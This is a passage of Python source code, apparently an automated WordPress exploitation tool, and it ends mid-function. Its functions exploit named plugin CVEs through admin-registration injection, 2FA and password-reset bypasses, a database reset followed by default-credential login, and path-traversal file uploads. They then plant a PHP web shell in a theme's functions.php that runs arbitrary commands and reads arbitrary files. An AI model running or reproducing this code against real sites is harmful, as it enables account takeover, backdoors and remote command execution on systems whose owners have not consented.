    theme_slug = ""
    editor_body = ""

    async def _try_editor(slug: str) -> tuple:
        url = f"{eff}/wp-admin/theme-editor.php?file=functions.php&theme={slug}"
        try:
            async with pm.request(
                "GET", url, headers={"Cookie": cookie_str, "User-Agent": _WP_UA, **bh},
                timeout=aiohttp.ClientTimeout(total=10, sock_connect=3), ssl=False,
            ) as r:
                if r.status != 200:
                    return slug, ""
                body = await r.text(errors="replace")
                if "newcontent" in body and "file editing has been disabled" not in body.lower():
                    return slug, body
        except Exception:
            pass
        return slug, ""

    async def _get_theme_from_admin() -> str:
        try:
            async with pm.request(
                "GET", eff + "/wp-admin/themes.php",
                headers={"Cookie": cookie_str, "User-Agent": _WP_UA, **bh},
                timeout=aiohttp.ClientTimeout(total=8, sock_connect=3), ssl=False,
            ) as resp:
                if resp.status == 200:
                    tbody = await resp.text(errors="replace")
                    m = re.search(r'themes\.php\?action=activate[^"]*&stylesheet=([^"&]+)', tbody)
                    if not m:
                        m = re.search(r'"active"[^}]*"stylesheet"\s*:\s*"([^"]+)"', tbody)
                    if m:
                        return m.group(1).strip()
        except Exception:
            pass
        return ""

    # Probe common themes and detect active theme simultaneously
    probe_slugs = list(_COMMON_THEMES)
    all_results = await asyncio.gather(
        _get_theme_from_admin(),
        *[_try_editor(s) for s in probe_slugs],
    )
    detected_slug = all_results[0]
    editor_results = all_results[1:]  # list of (slug, body) tuples

    # Use detected slug result if one of our parallel probes matched it
    for slug, body in editor_results:
        if body:
            theme_slug, editor_body = slug, body
            break

    # If detected slug differs from what we probed, fetch it now
    if detected_slug and detected_slug not in probe_slugs:
        _, editor_body_detected = await _try_editor(detected_slug)
        if editor_body_detected:
            theme_slug, editor_body = detected_slug, editor_body_detected

    if not editor_body:
        return None

    # Theme editor disabled (DISALLOW_FILE_EDIT = true)
    if "file editing has been disabled" in editor_body.lower():
        return None

    nonce_m = re.search(r'name=["\']nonce["\'][^>]*value=["\']([^"\']+)["\']', editor_body)
    if not nonce_m:
        nonce_m = re.search(r'id=["\']theme-plugin-editor-nonce["\'][^>]*value=["\']([^"\']+)["\']', editor_body)
    nonce = nonce_m.group(1) if nonce_m else ""

    # Extract current file content from the textarea
    content_m = re.search(r'<textarea[^>]+id=["\']newcontent["\'][^>]*>(.*?)</textarea>', editor_body, re.DOTALL)
    current_content = content_m.group(1) if content_m else "<?php"
    # Unescape HTML entities
    current_content = current_content.replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&").replace("&#039;", "'").replace("&quot;", '"')

    # Append a minimal trigger-based shell that only activates for our unique param
    shell_snippet = (
        f"\nif(isset($_REQUEST['{trigger_param}']))"
        f"{{echo '{_WP_PROBE_TOKEN}';"
        "if(isset($_REQUEST['cmd'])){$c=trim(shell_exec($_REQUEST['cmd']));echo\"\\n\".$c;}"
        "if(isset($_REQUEST['f'])){echo\"\\n\".@file_get_contents($_REQUEST['f']);}"
        "exit;}"
    )
    new_content = current_content + shell_snippet

    # POST updated file content
    try:
        async with pm.request(
            "POST", eff + "/wp-admin/theme-editor.php",
            data={
                "action": "edit-theme-plugin-file",
                "nonce": nonce,
                "file": "functions.php",
                "theme": theme_slug,
                "newcontent": new_content,
            },
            headers={"Cookie": cookie_str, "User-Agent": _WP_UA, **bh},
            timeout=aiohttp.ClientTimeout(total=15, sock_connect=5), ssl=False,
        ) as resp:
            save_body = await resp.text(errors="replace")
            if resp.status != 200:
                return None
            # WordPress theme editor returns JSON: {"success":true} or {"success":false,...}
            # Also bail on plain-text error messages (DISALLOW_FILE_EDIT, permissions, etc.)
            try:
                j = json.loads(save_body)
                if j.get("success") is False:
                    return None
            except (json.JSONDecodeError, AttributeError):
                # Non-JSON response — bail if it looks like an error
                sl = save_body.lower()
                if any(s in sl for s in ("file editing has been disabled", "permission denied",
                                          "you are not allowed", "cheatin")):
                    return None
    except Exception:
        return None

    # Verify shell executes
    shell_url = f"{base_url}/?{trigger_param}=1"
    st, body = await _wp_get(pm, eff + f"/?{trigger_param}=1", bypass_headers=bh, timeout=8)
    if st == 200 and body and _WP_PROBE_TOKEN in body:
        return shell_url
    return None


async def _test_ultimate_member_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2023-3460: register admin account via meta injection, upload via async-upload."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    import string as _str
    rnd = ''.join(random.choices(_str.ascii_lowercase + _str.digits, k=10))
    username = f"probe_{rnd}"
    password = f"P@ssw0rd_{rnd}"
    filename = _wp_probe_filename()

    # Step 0: find the UM registration form to extract form_id and nonce.
    # um_submit_form handler validates the form_id before processing any meta fields.
    form_id, nonce = "", ""
    for path in ("/?page=register", "/register/", "/register", "/membership-register"):
        st, body = await _wp_get(pm, eff + path, bypass_headers=bh, timeout=8)
        if st != 200 or not body:
            continue
        if "um-form" not in body.lower() and "um_submit_form" not in body:
            continue
        m = re.search(r'data-form-id=["\'](\d+)["\']', body)
        if not m:
            m = re.search(r'"form_id"\s*:\s*"?(\d+)', body)
        if m:
            form_id = m.group(1)
        n = re.search(r'"nonce"\s*:\s*"([^"]+)"', body)
        if not n:
            n = re.search(r'name=["\']nonce["\'][^>]+value=["\']([^"\']+)["\']', body)
        if n:
            nonce = n.group(1)
        if form_id:
            break

    # Step 1: register with wp_capabilities[administrator] = 1
    reg_form = aiohttp.FormData()
    reg_form.add_field("action", "um_submit_form")
    reg_form.add_field("mode", "register")
    if form_id:
        reg_form.add_field("form_id", form_id)
    reg_form.add_field("user_login", username)
    reg_form.add_field("user_email", f"{username}@probe.local")
    reg_form.add_field("user_password", password)
    reg_form.add_field("confirm_user_password", password)
    reg_form.add_field("wp_capabilities[administrator]", "1")
    reg_form.add_field("nonce", nonce)

    cookies: dict = {}
    try:
        async with pm.request(
            "POST", eff + "/wp-admin/admin-ajax.php",
            data=reg_form,
            headers={"User-Agent": _WP_UA, **bh},
            timeout=aiohttp.ClientTimeout(total=15, sock_connect=5),
            ssl=False,
            allow_redirects=True,
        ) as resp:
            await resp.read()
            # Collect any auth cookies set
            for k, v in resp.cookies.items():
                cookies[k] = v.value
    except Exception:
        return None

    if not any("wordpress_logged_in" in k for k in cookies):
        # Try logging in with the created account
        login_data = aiohttp.FormData()
        login_data.add_field("log", username)
        login_data.add_field("pwd", password)
        login_data.add_field("wp-submit", "Log+In")
        login_data.add_field("redirect_to", "/wp-admin/")
        login_data.add_field("testcookie", "1")
        try:
            async with pm.request(
                "POST", eff + "/wp-login.php",
                data=login_data,
                headers={"Cookie": "wordpress_test_cookie=WP+Cookie+check", **bh},
                timeout=aiohttp.ClientTimeout(total=12, sock_connect=5),
                ssl=False,
                allow_redirects=True,
            ) as resp:
                await resp.read()
                for k, v in resp.cookies.items():
                    cookies[k] = v.value
        except Exception:
            return None

    if not any("wordpress_logged_in" in k for k in cookies):
        return None

    # Step 2: inject shell via theme editor (async-upload.php blocks .php for all users)
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
    return await _wp_theme_editor_inject(pm, base_url, cookie_str, eff_base=eff, bypass_headers=bh)


async def _test_bit_file_manager_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2024-7627: write PHP probe via Bit File Manager unauthenticated file edit."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    filename = _wp_probe_filename()
    theme_slugs = await _wp_detect_theme_slugs(pm, base_url)

    # Path is resolved relative to views/application.php inside the plugin.
    # 3 levels up from views/ = wp-content/. Map each write path to its web URL.
    # Try uploads/ first; theme dirs bypass any .htaccess PHP-blocking on uploads/.
    write_targets: list = [
        (f"../../../uploads/{filename}",    f"/wp-content/uploads/{filename}"),
        (f"../../../../uploads/{filename}", f"/wp-content/uploads/{filename}"),
        (f"/wp-content/uploads/{filename}", f"/wp-content/uploads/{filename}"),
    ]
    for slug in theme_slugs[:5]:
        write_targets.append((
            f"../../../themes/{slug}/{filename}",
            f"/wp-content/themes/{slug}/{filename}",
        ))

    php_content = _WP_PROBE_PHP.decode()
    for dest, web_path in write_targets:
        # BFM changed parameter names across versions; try all known variants.
        # v6.x uses p=save + file=; earlier used p=edit_save + path=.
        # Also try admin-ajax.php with action=wp_file_manager (used in some builds).
        param_variants = [
            (eff + vuln["upload_endpoint"],
             {"p": "save",      "file": dest, "content": php_content}),
            (eff + vuln["upload_endpoint"],
             {"p": "edit_save", "path": dest, "content": php_content}),
            (eff + "/wp-admin/admin-ajax.php",
             {"action": "wp_file_manager", "p": "save",      "file": dest, "content": php_content}),
            (eff + "/wp-admin/admin-ajax.php",
             {"action": "wp_file_manager", "p": "edit_save", "path": dest, "content": php_content}),
        ]
        for post_url, post_data in param_variants:
            try:
                async with pm.request(
                    "POST", post_url, data=post_data,
                    headers={"User-Agent": _WP_UA, **bh},
                    timeout=aiohttp.ClientTimeout(total=12, sock_connect=5),
                    ssl=False,
                ) as resp:
                    await resp.read()
            except Exception:
                continue

            shell_url = base_url + web_path
            st, body = await _wp_get(pm, eff + web_path, bypass_headers=bh, timeout=8)
            if st == 200 and body and _WP_PROBE_TOKEN in body:
                return shell_url
    return None


async def _test_wfu_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2024-9047: path traversal in upload directory via WordPress File Upload plugin."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    filename = _wp_probe_filename()

    # Try to fetch a real wfu_nonce from a page containing the WFU shortcode.
    # Without a valid nonce WFU's AJAX handler rejects the request before the traversal check.
    wfu_nonce = ""
    for path in ("/", "/upload", "/file-upload", "/contact"):
        st, pg = await _wp_get(pm, eff + path, bypass_headers=bh, timeout=6)
        if st == 200 and pg and "wfu_" in pg:
            m = re.search(r'"wfu_nonce"\s*:\s*"([^"]+)"', pg)
            if not m:
                m = re.search(r'wfu_nonce["\s:=\']+([a-f0-9]{10})', pg)
            if m:
                wfu_nonce = m.group(1)
                break

    # WFU uses multiple action names across versions; try each with common field names.
    # The traversal goes in wfu_current_directory — the plugin appends this to its
    # configured base dir. Using ../../uploads/ escapes to wp-content/uploads/.
    for action, file_field in (
        ("wfu_ajax_action_upload_file", "userfile"),
        ("wfu_ajax_action_upload_file", "wfu_file"),
        ("wfu_ajax_action",             "userfile"),
        ("wfu_upload_file",             "userfile"),
    ):
        for traversal in ("../../uploads/", "../../../uploads/", "../../"):
            form = aiohttp.FormData()
            form.add_field("action", action)
            form.add_field("wfu_current_directory", traversal)
            form.add_field("wfu_nonce", wfu_nonce)
            form.add_field("wfu_shortcode_id", "1")
            form.add_field(
                file_field,
                io.BytesIO(_WP_PROBE_PHP),
                filename=filename,
                content_type="application/octet-stream",
            )
            try:
                async with pm.request(
                    "POST", eff + vuln["upload_endpoint"], data=form,
                    headers={"User-Agent": _WP_UA, **bh},
                    timeout=aiohttp.ClientTimeout(total=15, sock_connect=5),
                    ssl=False,
                ) as resp:
                    await resp.read()
            except Exception:
                continue

            shell_url = base_url + vuln["shell_dir"] + filename
            st, body = await _wp_get(pm, eff + vuln["shell_dir"] + filename, bypass_headers=bh, timeout=8)
            if st == 200 and body and _WP_PROBE_TOKEN in body:
                return shell_url
    return None


async def _test_really_simple_security_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2024-10924: auth bypass via 2FA REST API → admin session → upload shell."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    cookies: dict = {}

    # Fast-fail: the bypass only works when 2FA is enabled. Check the REST endpoint
    # exists first — saves 6+ requests on every site where 2FA is off.
    st_probe, _ = await _wp_get(
        pm, f"{eff}/wp-json/really-simple-plugins/v1/users/1", bypass_headers=bh, timeout=5
    )
    if st_probe not in (200, 401, 403):
        # 404 = endpoint doesn't exist (2FA not active or different plugin namespace)
        return None

    # The real bypass: the two_fa/skip REST endpoint accepts user_id without proper auth
    # and returns a logged-in session. Try user IDs 1-3 (admin is typically ID 1).
    # Run all 3 user ID attempts in parallel to avoid sequential wait.
    bypass_endpoints = (
        "/wp-json/really-simple-plugins/v1/two_fa/skip",
        "/wp-json/really-simple-security/v1/two_fa/skip",
    )

    async def _try_bypass(uid: int) -> dict:
        """Try auth bypass for one user ID. Returns cookies dict or {}."""
        st, body = await _wp_get(
            pm, f"{eff}/wp-json/really-simple-plugins/v1/users/{uid}", bypass_headers=bh, timeout=6
        )
        login_nonce = ""
        if st == 200 and body:
            m = re.search(r'"login_nonce"\s*:\s*"([^"]+)"', body)
            if m:
                login_nonce = m.group(1)
        found: dict = {}
        for endpoint in bypass_endpoints:
            try:
                async with pm.request(
                    "POST", eff + endpoint,
                    json={"user_id": uid, "login_nonce": login_nonce},
                    headers={"User-Agent": _WP_UA, "Content-Type": "application/json", **bh},
                    timeout=aiohttp.ClientTimeout(total=10, sock_connect=3),
                    ssl=False, allow_redirects=True,
                ) as resp:
                    await resp.read()
                    for k, v in resp.cookies.items():
                        found[k] = v.value
                    if any("wordpress_logged_in" in k for k in found):
                        return found
            except Exception:
                continue
        return found

    results = await asyncio.gather(*[_try_bypass(uid) for uid in (1, 2, 3)])
    for r in results:
        if any("wordpress_logged_in" in k for k in r):
            cookies = r
            break

    if not any("wordpress_logged_in" in k for k in cookies):
        return None

    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
    return await _wp_theme_editor_inject(pm, base_url, cookie_str, eff_base=eff, bypass_headers=bh)


async def _test_revslider_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2014-9734: Slider Revolution ZIP import — PHP file at ZIP root."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    import zipfile
    base_name = f"wp_health_{format(random.randint(0, 0xFFFFFFFF), '08x')}"

    # Fetch nonce from homepage
    nonce = ""
    st_home, home_body = await _wp_get(pm, eff + "/", bypass_headers=bh, timeout=6)
    if st_home == 200 and home_body:
        for pattern in (
            r'"revslider_nonce"\s*:\s*"([^"]+)"',
            r'revslider_ajax_nonce\s*[=:]\s*["\']([^"\']+)["\']',
            r'"nonce"\s*:\s*"([^"]+)"',
        ):
            m = re.search(pattern, home_body)
            if m:
                nonce = m.group(1)
                break

    slider_json = json.dumps({
        "title": "probe", "alias": "probe",
        "settings": {"delay": "9000", "startwidth": "1170", "startheight": "500"},
        "slides": [], "static_slides": [],
    })

    # Pack multiple extensions so whichever PHP handler accepts gets used
    for ext in (".php", ".phar", ".php5", ".phtml"):
        filename = base_name + ext
        zip_buf = io.BytesIO()
        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("slider.json", slider_json)
            zf.writestr(filename, _WP_PROBE_PHP)
        zip_buf.seek(0)
        zip_bytes = zip_buf.read()

        for client_action in ("import_slider", "importSlider"):
            form = aiohttp.FormData()
            form.add_field("action", "revslider_ajax_action")
            form.add_field("client_action", client_action)
            form.add_field("nonce", nonce)
            form.add_field(
                "import_file", io.BytesIO(zip_bytes),
                filename="slider.zip", content_type="application/zip",
            )
            try:
                async with pm.request(
                    "POST", eff + "/wp-admin/admin-ajax.php", data=form,
                    headers={"User-Agent": _WP_UA, **bh},
                    timeout=aiohttp.ClientTimeout(total=20, sock_connect=3),
                    ssl=False, allow_redirects=False,
                ) as resp:
                    await resp.read()
            except Exception:
                continue

        shell_dir = vuln["shell_dir"]
        for candidate in (
            f"{shell_dir}{filename}",
            f"/wp-content/uploads/revslider/assets/images/{filename}",
            f"/wp-content/plugins/revslider/sr/assets/images/{filename}",
            f"/wp-content/plugins/revslider/public/assets/img/{filename}",
            f"/wp-content/uploads/{filename}",
        ):
            st, body = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=6)
            if st == 200 and body and _WP_PROBE_TOKEN in body:
                return base_url + candidate

    return None


async def _test_ninja_forms_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2024-5764: Ninja Forms file-field upload via unauthenticated form submit."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    filename = _wp_probe_filename()

    for path in ("/", "/contact", "/contact-us", "/get-in-touch"):
        st, body = await _wp_get(pm, eff + path, bypass_headers=bh, timeout=8)
        if st != 200 or not body:
            continue
        if "ninja" not in body.lower() and "nf-form" not in body:
            continue

        form_id_m = re.search(r'nf-form-(\d+)|data-formid=["\'](\d+)["\']', body)
        if not form_id_m:
            continue
        form_id = form_id_m.group(1) or form_id_m.group(2)

        # Ninja Forms localizes its nonce as either "nonce" or "_nonce" in the page
        nonce_m = re.search(r'"_?nonce"\s*:\s*"([^"]+)"', body)
        nonce = nonce_m.group(1) if nonce_m else ""

        # Try common file-field key names; Ninja Forms uses fields[{key}] format
        for file_key in ("fields[file_upload]", "fields[file]", "fields[attachment]", "fields[upload]"):
            form = aiohttp.FormData()
            form.add_field("action", "nf_ajax_submit")
            form.add_field("form_id", form_id)
            form.add_field("_nonce", nonce)
            form.add_field("nonce", nonce)
            form.add_field(
                file_key,
                io.BytesIO(_WP_PROBE_PHP),
                filename=filename,
                content_type="application/octet-stream",
            )
            try:
                async with pm.request(
                    "POST", eff + "/wp-admin/admin-ajax.php", data=form,
                    headers={"User-Agent": _WP_UA, **bh},
                    timeout=aiohttp.ClientTimeout(total=15, sock_connect=5), ssl=False,
                ) as resp:
                    text = await resp.text(errors="replace")
                    url = _extract_uploaded_php_url(text)
                    if url:
                        return url
            except Exception:
                continue

        for candidate in (
            f"/wp-content/uploads/ninja-forms/{filename}",
            f"/wp-content/uploads/nf-form-uploads/{filename}",
            *_wp_date_candidates("/wp-content/uploads/", filename),
        ):
            st2, b2 = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=8)
            if st2 == 200 and b2 and _WP_PROBE_TOKEN in b2:
                return base_url + candidate

    return None


async def _test_wpforms_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2024-10124: WPForms file-field upload via unauthenticated form submit."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    filename = _wp_probe_filename()

    for path in ("/", "/contact", "/contact-us"):
        st, body = await _wp_get(pm, eff + path, bypass_headers=bh, timeout=8)
        if st != 200 or not body:
            continue
        if "wpforms" not in body.lower():
            continue

        form_id_m = re.search(r'wpforms-form-(\d+)|"id"\s*:\s*"?(\d+)"?[^}]*"form_class"', body)
        if not form_id_m:
            continue
        form_id = form_id_m.group(1) or form_id_m.group(2)

        nonce_m = re.search(r'"nonce"\s*:\s*"([^"]+)"', body)
        nonce = nonce_m.group(1) if nonce_m else ""

        # Extract actual file-field IDs from the rendered form HTML.
        # WPForms renders: <input ... name="wpforms[fields][7]" type="file">
        # Also check the JS config block: "fields":{"7":{"type":"file",...}}
        file_field_ids = []
        for m in re.finditer(
            r'name=["\']wpforms\[fields\]\[(\d+)\]["\'][^>]*type=["\']file["\']'
            r'|type=["\']file["\'][^>]*name=["\']wpforms\[fields\]\[(\d+)\]["\']',
            body,
        ):
            fid = m.group(1) or m.group(2)
            if fid not in file_field_ids:
                file_field_ids.append(fid)
        # JS config fallback
        if not file_field_ids:
            for m in re.finditer(r'"(\d+)"\s*:\s*\{[^}]*"type"\s*:\s*"file"', body):
                if m.group(1) not in file_field_ids:
                    file_field_ids.append(m.group(1))
        # Last resort: try IDs 0–20 (covers most real forms without the old 0-5 truncation)
        if not file_field_ids:
            file_field_ids = [str(i) for i in range(21)]

        for field_id in file_field_ids:
            form = aiohttp.FormData()
            form.add_field("action", "wpforms_submit")
            form.add_field("wpforms[id]", form_id)
            form.add_field("wpforms[token]", nonce)
            form.add_field(
                f"wpforms[fields][{field_id}]",
                io.BytesIO(_WP_PROBE_PHP),
                filename=filename,
                content_type="application/octet-stream",
            )
            try:
                async with pm.request(
                    "POST", eff + "/wp-admin/admin-ajax.php", data=form,
                    headers={"User-Agent": _WP_UA, **bh},
                    timeout=aiohttp.ClientTimeout(total=15, sock_connect=5), ssl=False,
                ) as resp:
                    text = await resp.text(errors="replace")
                    url = _extract_uploaded_php_url(text)
                    if url:
                        return url
            except Exception:
                continue

        for candidate in (
            f"/wp-content/uploads/wpforms/{filename}",
            *_wp_date_candidates("/wp-content/uploads/", filename),
        ):
            st2, b2 = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=8)
            if st2 == 200 and b2 and _WP_PROBE_TOKEN in b2:
                return base_url + candidate

    return None


async def _test_essential_addons_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2023-32243: unauthenticated password-reset bypass → admin login → upload."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    import string as _str
    rnd = ''.join(random.choices(_str.ascii_lowercase + _str.digits, k=12))
    new_pass = f"Pr0be!{rnd}"
    filename = _wp_probe_filename()

    # Try to discover the real admin username — REST API exposes user slugs publicly on
    # many sites. Fall back to "admin" if not available.
    admin_login = "admin"
    try:
        st_u, body_u = await _wp_get(
            pm, eff + "/wp-json/wp/v2/users?per_page=1&orderby=id&order=asc", bypass_headers=bh, timeout=6
        )
        if st_u == 200 and body_u:
            users = json.loads(body_u)
            if users and isinstance(users, list) and users[0].get("slug"):
                admin_login = users[0]["slug"]
    except Exception:
        pass

    # Reset password without a valid token — CVE-2023-32243 exploits missing token validation
    reset_success = False
    for login_candidate in dict.fromkeys([admin_login, "admin"]):  # dedupe but try both
        try:
            async with pm.request(
                "POST", eff + "/wp-admin/admin-ajax.php",
                data={
                    "action": "eael_resetpassword",
                    "rp_login": login_candidate,
                    "password": new_pass,
                    "rp_key": "",
                },
                headers={"User-Agent": _WP_UA, **bh},
                timeout=aiohttp.ClientTimeout(total=12, sock_connect=5), ssl=False,
            ) as resp:
                result = await resp.text(errors="replace")
                if "success" in result.lower():
                    admin_login = login_candidate
                    reset_success = True
                    break
        except Exception:
            continue
    if not reset_success:
        return None

    cookies: dict = {}
    login_form = aiohttp.FormData()
    login_form.add_field("log", admin_login)
    login_form.add_field("pwd", new_pass)
    login_form.add_field("wp-submit", "Log+In")
    login_form.add_field("redirect_to", "/wp-admin/")
    login_form.add_field("testcookie", "1")
    try:
        async with pm.request(
            "POST", eff + "/wp-login.php", data=login_form,
            headers={"Cookie": "wordpress_test_cookie=WP+Cookie+check", **bh},
            timeout=aiohttp.ClientTimeout(total=12, sock_connect=5), ssl=False,
            allow_redirects=True,
        ) as resp:
            await resp.read()
            for k, v in resp.cookies.items():
                cookies[k] = v.value
    except Exception:
        return None

    if not any("wordpress_logged_in" in k for k in cookies):
        return None

    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
    return await _wp_theme_editor_inject(pm, base_url, cookie_str, eff_base=eff, bypass_headers=bh)


async def _test_themegrill_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2020-8772: unauthenticated DB reset → default admin/admin → upload."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    filename = _wp_probe_filename()

    try:
        async with pm.request(
            "POST", eff + "/wp-admin/admin-ajax.php",
            data={"action": "themegrill_demo_importer_reset_confirmed"},
            headers={"User-Agent": _WP_UA, **bh},
            timeout=aiohttp.ClientTimeout(total=20, sock_connect=5), ssl=False,
        ) as resp:
            result = await resp.text(errors="replace")
            if resp.status not in (200, 302) or "success" not in result.lower():
                return None
    except Exception:
        return None

    cookies: dict = {}
    for pwd_candidate in ("admin", "password", "wordpress", ""):
        _cookies: dict = {}
        login_form = aiohttp.FormData()
        login_form.add_field("log", "admin")
        login_form.add_field("pwd", pwd_candidate)
        login_form.add_field("wp-submit", "Log+In")
        login_form.add_field("redirect_to", "/wp-admin/")
        login_form.add_field("testcookie", "1")
        try:
            async with pm.request(
                "POST", eff + "/wp-login.php", data=login_form,
                headers={"Cookie": "wordpress_test_cookie=WP+Cookie+check", **bh},
                timeout=aiohttp.ClientTimeout(total=12, sock_connect=5), ssl=False,
                allow_redirects=True,
            ) as resp:
                await resp.read()
                for k, v in resp.cookies.items():
                    _cookies[k] = v.value
        except Exception:
            continue
        if any("wordpress_logged_in" in k for k in _cookies):
            cookies = _cookies
            break

    if not any("wordpress_logged_in" in k for k in cookies):
        return None

    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
    return await _wp_theme_editor_inject(pm, base_url, cookie_str, eff_base=eff, bypass_headers=bh)


async def _test_hunk_companion_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2024-11972: check_only — REST endpoint installs from slug, can't upload custom PHP."""
    return None


async def _test_startklar_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2025-1772: Startklar Elementor Addons unauthenticated path-traversal file upload."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    filename = _wp_probe_filename()
    theme_slugs = await _wp_detect_theme_slugs(pm, base_url)

    # Build list of (traversal_path, web_url) targets: uploads/ first, then theme dirs.
    traversal_targets: list = [
        (f"../../../uploads/{filename}", vuln["shell_dir"] + filename),
    ]
    for slug in theme_slugs[:4]:
        traversal_targets.append((
            f"../../../themes/{slug}/{filename}",
            f"/wp-content/themes/{slug}/{filename}",
        ))

    # Raw multipart body preserves ../ in filename (aiohttp would URL-encode it otherwise)
    boundary = "----WPProbe7a3f8c"
    for traversal, web_path in traversal_targets:
        for action in ("startklar_upload_file", "startklar_upload", "startklar_form_upload"):
            raw_body = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="action"\r\n\r\n{action}\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="nonce"\r\n\r\n\r\n'
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="file"; filename="{traversal}"\r\n'
                f"Content-Type: image/jpeg\r\n\r\n"
            ).encode() + _WP_PROBE_PHP + f"\r\n--{boundary}--\r\n".encode()
            try:
                async with pm.request(
                    "POST", eff + vuln["upload_endpoint"],
                    data=raw_body,
                    headers={
                        "User-Agent": _WP_UA,
                        "Content-Type": f"multipart/form-data; boundary={boundary}",
                        "Content-Length": str(len(raw_body)),
                        **bh,
                    },
                    timeout=aiohttp.ClientTimeout(total=15, sock_connect=5), ssl=False,
                ) as resp:
                    await resp.read()
            except Exception:
                continue

            st, body = await _wp_get(pm, eff + web_path, bypass_headers=bh, timeout=8)
            if st == 200 and body and _WP_PROBE_TOKEN in body:
                return base_url + web_path
    return None


async def _test_simple_wp_events_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2025-2004: Simple WP Events unauthenticated arbitrary file upload via import."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    filename = _wp_probe_filename()
    theme_slugs = await _wp_detect_theme_slugs(pm, base_url)

    # Build (upload_filename, web_path) targets: plain .php first, then theme traversal.
    filename_targets: list = [(filename, vuln["shell_dir"] + filename)]
    for slug in theme_slugs[:4]:
        t_name = f"../../../themes/{slug}/{filename}"
        filename_targets.append((t_name, f"/wp-content/themes/{slug}/{filename}"))

    for action, field_name, ctype in (
        ("swe_import_ics_file",    "import_file", "text/calendar"),
        ("simple_wp_events_import","import_file", "text/csv"),
        ("swe_import_events",      "import_file", "text/csv"),
        ("swe_csv_import",         "csv_file",    "text/csv"),
    ):
        for upload_filename, web_path in filename_targets:
            form = aiohttp.FormData()
            form.add_field("action", action)
            form.add_field("nonce", "")
            form.add_field(
                field_name,
                io.BytesIO(_WP_PROBE_PHP),
                filename=upload_filename,
                content_type=ctype,
            )
            try:
                async with pm.request(
                    "POST", eff + vuln["upload_endpoint"], data=form,
                    headers={"User-Agent": _WP_UA, **bh},
                    timeout=aiohttp.ClientTimeout(total=15, sock_connect=5), ssl=False,
                ) as resp:
                    await resp.read()
            except Exception:
                continue

            candidates = [web_path]
            if upload_filename == filename:
                candidates += [
                    f"/wp-content/uploads/{filename}",
                    *_wp_date_candidates("/wp-content/uploads/", filename),
                ]
            for candidate in candidates:
                st, body = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=8)
                if st == 200 and body and _WP_PROBE_TOKEN in body:
                    return base_url + candidate
    return None


async def _test_givewp_injection(
    pm: ProxyManager, base_url: str, vuln: dict
) -> Optional[str]:
    """CVE-2025-22777: version detection only — POP chain not automatable safely."""
    # check_only=True in wp_vulns.json; this function is never called by _test_wp_upload_vuln
    return None


async def _test_jupiterx_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2025-0316: register subscriber account → exploit JupiterX Core file upload."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    import string as _str
    rnd = ''.join(random.choices(_str.ascii_lowercase + _str.digits, k=10))
    username = f"probe_{rnd}"
    password = f"P@ssw0rd_{rnd}"
    filename = _wp_probe_filename()

    # Register a subscriber account (requires open registration)
    reg_form = aiohttp.FormData()
    reg_form.add_field("action", "register")
    reg_form.add_field("user_login", username)
    reg_form.add_field("user_email", f"{username}@probe.local")
    reg_form.add_field("user_pass", password)
    cookies: dict = {}
    try:
        async with pm.request(
            "POST", eff + "/wp-login.php?action=register", data=reg_form,
            headers={"User-Agent": _WP_UA, **bh},
            timeout=aiohttp.ClientTimeout(total=12, sock_connect=5), ssl=False,
            allow_redirects=True,
        ) as resp:
            await resp.read()
    except Exception:
        return None

    # Login as new subscriber
    login_form = aiohttp.FormData()
    login_form.add_field("log", username)
